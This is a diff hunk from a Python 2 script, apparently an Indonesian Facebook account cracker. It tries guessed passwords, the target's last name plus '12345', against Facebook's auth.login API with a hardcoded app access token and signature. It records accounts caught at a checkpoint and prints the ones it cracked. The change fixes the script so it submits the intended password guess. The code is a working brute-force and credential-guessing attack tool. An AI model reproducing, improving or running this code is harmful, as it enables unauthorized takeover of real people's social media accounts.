@@ -450,7 +450,7 @@ def pilih_super():
 																	cekpoint.append(user+pass7)
                                                                                                                                 else:
 													                                pass8 = b['last_name'] + '12345'
-													                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													                                q = json.load(data)
 													                                if 'access_token' in q:
 														                                print '          \x1b[1;92m[Selesai✔] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass8 + ' ✔ ' + b['name']
